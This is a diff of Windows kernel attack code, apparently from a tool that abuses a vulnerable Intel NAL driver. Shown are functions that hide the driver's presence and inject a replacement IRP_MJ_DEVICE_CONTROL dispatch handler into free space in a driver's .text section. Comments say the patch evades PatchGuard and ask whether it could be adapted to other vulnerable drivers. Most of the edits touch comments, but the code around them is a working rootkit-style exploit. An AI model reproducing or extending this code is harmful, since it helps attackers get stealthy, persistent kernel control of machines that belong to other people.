@@ -903,6 +903,8 @@ int HideNalDriverPresence(void)
  return 0;
 }
 //---------------------------------------------------------------------------
+// Puts our IRP_MJ_DEVICE_CONTROL handler in the driver`s object (PatchGuard ignores that)
+//
 int ExtendNalDrvFunct(void)
 {
  union   // Use union to avoid separate memory allocation on stack for mutual exclusive and temporary objects
@@ -1276,7 +1278,10 @@ struct DEVICE_OBJECT
 };
 
 //$$$$$$$$$$$$$$$$$$ MUST BE PREBUILT FOR BOTH x32 AND x64 $$$$$$$$$$$$$$$$$$
-// Injected into free space of '.text' section  // MUST fit in rest of code page  // Data starts at 'NextPageAddr - sizeof(SKrnlDrvEx)'
+// Injected into free space of a driver`s '.text' section  // MUST fit in rest of code page  // Data starts at 'NextPageAddr - sizeof(SKrnlDrvEx)'
+// It extends an original IRP_MJ_CONTROL handler procedure with the one which performs more interesting operations
+// TODO: Use some compact string encryption for logging (An alternative implementation without intentional code bloating)
+// Can be adapdet to be compatible with other vulnerable drivers, not only NAL drivers?
 
 #ifdef NALBUILDEXTBLK
 #define NALEXTSECNAME ".extend"
@@ -1292,6 +1297,7 @@ struct DEVICE_OBJECT
 
 #define EXTPROC __declspec(dllexport)        // Exported to keep unreferenced code
 #pragma code_seg(push, NALEXTSECNAME)           // WARNING: Make sure that here will be no references to other sections!
+
 struct SKDrvExCtx     // Max size: x64=48; x32=28
 { 
  UINT64 pOrigIrpMjCtrlDispatch;    // Assigned from user mode
@@ -1303,7 +1309,7 @@ struct SKDrvExCtx     // Max size: x64=48; x32=28
  NTSTATUS (NTAPI* pNtClose)(HANDLE Handle);
 #endif
 //---------------------------------------------------------------------------
-#pragma optimize( "yt", on )    // NOTE: Return optimized only with 'Ox' optimization
+#pragma optimize( "yt", on )    // NOTE: Return is optimized only with 'Ox' optimization
 EXTPROC static NTSTATUS _stdcall AIrpMjCtrlDispatchEx(DEVICE_OBJECT* DeviceObject, IRP* Irp)   // This os our extended IrpMjDevControlDispatch   // Functions sorted alphabetically. This function name must start with 'A' for it to be first in the section     // Corrupts stack on x32 'stdcall' but next call is NtContinue anyway
 {
  SKDrvExCtx* Ctx = GetExCtx(); 
@@ -1324,7 +1330,7 @@ EXTPROC static NTSTATUS _stdcall AIrpMjCtrlDispatchEx(DEVICE_OBJECT* DeviceObjec
  return ((NTSTATUS (_stdcall*)(DEVICE_OBJECT*, IRP*))Ctx->pOrigIrpMjCtrlDispatch)(DeviceObject, Irp);   
 } 
 //---------------------------------------------------------------------------
-#pragma optimize( "yt", on )    // NOTE: Return optimized only with 'Ox' optimization
+#pragma optimize( "yt", on )    // NOTE: Return is optimized only with 'Ox' optimization
 _declspec(noinline) static SKDrvExCtx* _fastcall GetExCtx(void)
 {
  return (SKDrvExCtx*)((((SIZE_T)_ReturnAddress()) & ~((SIZE_T)0xFFF)) + (0x1000 - sizeof(SKDrvExCtx)));  
